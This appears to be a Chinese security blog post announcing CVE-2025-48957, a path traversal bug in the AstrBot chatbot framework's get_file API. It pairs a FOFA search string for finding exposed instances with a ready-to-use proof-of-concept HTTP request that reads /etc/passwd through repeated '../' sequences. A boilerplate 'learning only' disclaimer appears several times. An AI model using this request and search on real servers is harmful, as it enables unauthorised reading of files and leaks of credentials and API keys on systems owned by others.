#  CVE-2025-48957 AstrBot get_file接口存在任意文件读取漏洞  
 HK安全小屋   2025-06-19 15:58  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
AstrBot是一个大型语言模型聊天机器人和开发框架。版本3.4.4至3.5.12中存在路径遍历漏洞，可能导致信息泄露，如LLM提供商的API密钥、账户密码和其他敏感数据。漏洞已在Pull Request #1676中得到解决，并包含在版本3.5.13中。作为临时解决方案，用户可以编辑cmd_config.json文件以禁用仪表板功能。但是，强烈建议升级到版本v3.5.13或更高版本以完全解决此问题。  
  
  
影响版本：  
  
  
3.4.4<  
AstrBot<  
3.5.12  
  
  
  
FOFA:  
```
"AstrBot"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0PqkbRg3OxADSRLgIo3AibOoWqrFpuXrhgzIQRJ7b4KoHTrVTvp5K63RN1LOTbqECUr40RlBibwiaMQ/640?wx_fmt=png&from=appmsg "")  
  
  
POC：  
```
GET /api/chat/get_file?filename=../../../../../../../../etc/passwd
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: */*
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI0PqkbRg3OxADSRLgIo3AibOrGXpmgqeM4b9MvJoHm6LFyEjWdFia6DVEehAIm88HbxSpibQ8zyThAEw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
